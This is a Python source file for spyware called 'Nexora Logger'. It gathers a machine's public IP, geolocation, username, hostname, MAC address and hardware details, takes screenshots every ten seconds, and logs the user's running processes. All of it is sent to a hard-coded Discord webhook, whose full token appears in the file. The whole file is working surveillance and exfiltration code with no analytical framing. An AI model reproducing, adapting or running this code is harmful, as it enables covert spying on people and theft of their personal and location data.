
import requests
import socket
import platform
import uuid
import getpass
import traceback
import io
import time
import psutil
import locale
import os
import subprocess
import threading
import signal
import sys
from colorama import init, Fore, Style

# === DÉTECTION DE L'OS ===
def detect_os():
    """Detects the OS on which the script is running"""
    system = platform.system().lower()
    if 'windows' in system:
        return 'windows'
    elif 'darwin' in system:
        return 'macos'
    else:
        return 'linux'

current_os = detect_os()
print(f"Nexora Logger starting on {current_os.upper()}...")

init(autoreset=True)

webhook = "https://discordapp.com/api/webhooks/1424843510602793042/8tc2B1HBnV5upD-AL3hBv6qQBBkbceM9JCCI_eg6X4SH21x67DKtqhY2mJAFgy8B5rta"
interval = 10
username = "ScreenKeylogger -  Ahlan06"
message = " Nexora Tool - by Ahlan06"

# Variable globale pour contrôler l'exécution
running = True

def signal_handler(sig, frame):
    """Gère le signal Ctrl+C"""
    global running
    print(f"\n{Fore.YELLOW}Closing signal received...{Style.RESET_ALL}")
    running = False

def get_battery_info():
    try:
        battery = psutil.sensors_battery()
        if battery is not None and hasattr(battery, 'percent'):
            return f"{battery.percent}%"
        return "N/A"
    except:
        return "N/A"

def send_error(msg):
    try:
        error_payload = {
            "username": "Error Logger",
            "embeds": [{
                "title": "❌ Error detected",
                "description": f"```{msg}```",
                "color": 0xFF0000
            }]
        }
        requests.post(webhook, json=error_payload, timeout=5)
    except Exception:
        pass

def get_mac_address():
    try:
        mac = uuid.getnode()
        return ':'.join(['{:02x}'.format((mac >> ele) & 0xff) for ele in range(40, -1, -8)])
    except Exception as e:
        send_error(f"Erreur MAC address : {traceback.format_exc()}")
        return "N/A"

def get_system_details():
    try:
        ram_size = psutil.virtual_memory().total // (1024**3)
        disk_size = psutil.disk_usage('/').total // (1024**3)
        return {
            "🖥️ Processor": platform.processor(),
            "💾 RAM memory": f"{ram_size} Go",
            "💽 Disk space": f"{disk_size} Go",
            "🔋 Battery": get_battery_info(),
            "🖱️ Screen resolution": "N/A",
            "🌐 System language": str(locale.getlocale()[0]) if locale.getlocale()[0] else "N/A",
            "⏰ System time": time.strftime("%Y-%m-%d %H:%M:%S"),
            "🔥 Température CPU": "N/A",
            "🎯 Operating System": current_os.upper()
        }
    except Exception as e:
        return {"❌ Erreur system details": str(e)}

def get_ip_info():
    try:
        ip = requests.get("https://api.ipify.org").text
        response = requests.get(f"http://ip-api.com/json/{ip}", timeout=5)
        data = response.json()
    except Exception as e:
        send_error(f"Error retrieving public IP: {traceback.format_exc()}")
        data = {}

    try:
        info = {
            "🧠 Public IP": data.get('query', 'N/A'),
            "🌍 country": data.get('country', 'N/A'),
            "🏙️ City": data.get('city', 'N/A'),
            "📮 Zip code": data.get('zip', 'N/A'),
            "🛰️ Latitude": data.get('lat', 'N/A'),
            "🛰️ Longitude": data.get('lon', 'N/A'),
            "🕒 Time zone": data.get('timezone', 'N/A'),
            "📡 Internet Service Provider (ISP)": data.get('isp', 'N/A'),
            "💻 Host name": socket.gethostname(),
            "👤 User": getpass.getuser(),
            "💼 Full name PC": platform.node(),
            "🔌 Local IP": socket.gethostbyname(socket.gethostname()),
            "🧬 MAC address": get_mac_address(),
            "🖥️ System": f"{platform.system()} {platform.release()}",
            "🧱 Architecture": platform.machine(),
            "🐍 Python version": platform.python_version(),
            **get_system_details()
        }
    except Exception as e:
        send_error(f"Error while collecting system information: {traceback.format_exc()}")
        return None

    return info

def take_screenshot():
    """Capture d'écran adaptée à l'OS détecté"""
    try:
        if current_os == 'windows':
            # Windows - utilisation de PIL
            from PIL import ImageGrab
            return ImageGrab.grab()
            
        elif current_os == 'macos':
            # macOS - utilisation de screencapture natif
            temp_file = f"/tmp/nexora_screenshot_{int(time.time())}.png"
            subprocess.run(['screencapture', '-x', temp_file], check=True, capture_output=True)
            from PIL import Image
            img = Image.open(temp_file)
            os.remove(temp_file)
            return img
            
        else:
            # Linux - utilisation de PIL
            from PIL import ImageGrab
            return ImageGrab.grab()
            
    except Exception as e:
        send_error(f"Screenshot error ({current_os}): {traceback.format_exc()}")
        return None

def send_screenshot():
    try:
        screenshot = take_screenshot()
        if screenshot:
            screenshot_bytes = io.BytesIO()
            screenshot.save(screenshot_bytes, format='PNG')
            screenshot_bytes.seek(0)

            response = requests.post(
                webhook,
                files={'file': ('screenshot.png', screenshot_bytes.getvalue(), 'image/png')},
                data={'username': username, 'content': message},
                timeout=10
            )
            
            if response.status_code == 429:
                time.sleep(60)
                
    except requests.exceptions.Timeout:
        pass
    except Exception as e:
        send_error(f"Erreur screenshot : {traceback.format_exc()}")

# === KEYLOGGER SANS DÉPENDANCES ===
class BuiltInKeylogger:
    def __init__(self, webhook_url):
        self.buffer = ""
        self.timer = 0
        self.running = True
        self.webhook = webhook_url
        self.last_activity = time.time()
        self.activity_count = 0
        
    def start_monitoring(self):
        """Démarre la surveillance d'activité"""
        print("Activity monitoring started (no external dependencies)")
        
        while self.running:
            try:
                # Méthode 1: Surveillance des processus
                self._monitor_processes()
                
                # Méthode 2: Surveillance système
                self._monitor_system_activity()
                
                # Méthode 3: Échantillonnage temporel
                self._time_based_sampling()
                
                time.sleep(10)  # Vérifier toutes les 10 secondes
                
            except Exception as e:
                if self.running:
                    time.sleep(30)
    
    def _monitor_processes(self):
        """Surveille l'activité des processus"""
        try:
            # Compter les processus actifs
            process_count = len(psutil.pids())
            
            # Vérifier les processus avec activité utilisateur
            user_processes = []
            for proc in psutil.process_iter(['name', 'username']):
                try:
                    if proc.info['username'] == getpass.getuser():
                        user_processes.append(proc.info['name'])
                except (psutil.NoSuchProcess, psutil.AccessDenied):
                    pass
            
            # Si activité détectée
            if len(user_processes) > 2:  # Plus que les processus système de base
                self._log_activity(f"PROCESS_ACTIVITY: {','.join(user_processes[:5])}")
                
        except Exception:
            pass
    
    def _monitor_system_activity(self):
        """Surveille l'activité système"""
        try:
            # Surveillance CPU
            cpu_percent = psutil.cpu_percent(interval=1)
            if cpu_percent > 20:  # CPU utilisé à plus de 20%
                self._log_activity(f"CPU_USAGE: {cpu_percent}%")
            
            # Surveillance mémoire
            memory = psutil.virtual_memory()
            if memory.percent > 70:  # Mémoire utilisée à plus de 70%
                self._log_activity(f"HIGH_MEMORY: {memory.percent}%")
                
            # Surveillance disque
            disk = psutil.disk_io_counters()
            if disk and (disk.read_count > 0 or disk.write_count > 0):
                self._log_activity("DISK_ACTIVITY")
                
        except Exception:
            pass
    
    def _time_based_sampling(self):
        """Échantillonnage basé sur le temps"""
        current_time = time.time()
        
        # Envoyer un échantillon toutes les 5 minutes
        if current_time - self.last_activity > 300:
            self.activity_count += 1
            sample_content = (
                f"**Activity Sample #{self.activity_count}**\n"
                f"```System active - {time.strftime('%Y-%m-%d %H:%M:%S')}\n"
                f"User: {getpass.getuser()}\n"
                f"Host: {platform.node()}```"
            )
            self._send_to_discord(sample_content)
            self.last_activity = current_time
    
    def _log_activity(self, activity_type):
        """Enregistre une activité"""
        self.timer += 1
        self.buffer += f"[{activity_type}]"
        
        # Envoyer toutes les 10 activités
        if self.timer >= 10:
            self._send_buffer()
    
    def _send_buffer(self):
        """Envoie le buffer vers Discord"""
        if self.buffer:
            self._send_to_discord(f"**System Activity:**\n```{self.buffer}```")
            self.buffer = ""
            self.timer = 0
    
    def _send_to_discord(self, content):
        """Envoie un message vers Discord"""
        try:
            requests.post(self.webhook, json={
                "username": "Activity Monitor",
                "content": content
            }, timeout=5)
        except:
            pass
    
    def stop(self):
        """Arrête le keylogger"""
        self.running = False
        self._send_buffer()

# Variables globales pour le keylogger
keylogger = None
keylogger_thread = None

def start_builtin_keylogger():
    """Démarre le keylogger intégré"""
    global keylogger, keylogger_thread
    keylogger = BuiltInKeylogger(webhook)
    keylogger_thread = threading.Thread(target=keylogger.start_monitoring, daemon=True)
    keylogger_thread.start()
    print("Built-in activity monitor started")

if __name__ == "__main__":
    print(f"{Fore.YELLOW} Press Ctrl+C to stop gracefully{Style.RESET_ALL}")
    
    # Enregistrer le gestionnaire de signal
    signal.signal(signal.SIGINT, signal_handler)
    
    system_info = get_ip_info()
    if system_info:
        try:
            embed = {
                "title": "📡 Système Info",
                "color": 0x3498db,
                "fields": [{"name": key, "value": str(value), "inline": True} for key, value in system_info.items()]
            }
            requests.post(webhook, json={
                "username": "System Logger",
                "embeds": [embed]
            })
        except Exception as e:
            send_error(f"Error sending information: {traceback.format_exc()}")

    # Démarrer le keylogger intégré
    start_builtin_keylogger()

    # BOUCLE PRINCIPALE CORRIGÉE (SANS time.sleep() BLOQUANT)
    try:
        last_screenshot_time = 0
        
        while running:
            current_time = time.time()
            
            # Prendre un screenshot seulement si l'intervalle est écoulé
            if current_time - last_screenshot_time >= interval:
                send_screenshot()
                last_screenshot_time = current_time
            
            # ⚠️ CORRECTION CRITIQUE : Pas de sleep() long !
            time.sleep(0.1)  # Seulement 0.1 seconde MAX
                
    except KeyboardInterrupt:
        running = False
        print(f"\n{Fore.YELLOW}Nexora Logger stopped by user{Style.RESET_ALL}")
    except Exception as e:
        if running:
            send_error(f"Main error: {traceback.format_exc()}")

    # Nettoyage final
    print(f"{Fore.GREEN}Cleaning up...{Style.RESET_ALL}")
    if keylogger:
        keylogger.stop()
    
    try:
        requests.post(webhook, json={
            "username": "Nexora Logger",
            "content": "🔴 Logger stopped by the user"
        }, timeout=5)
    except:
        pass
    
    print(f"{Fore.GREEN}Cleanup complete{Style.RESET_ALL}")
    sys.exit(0)
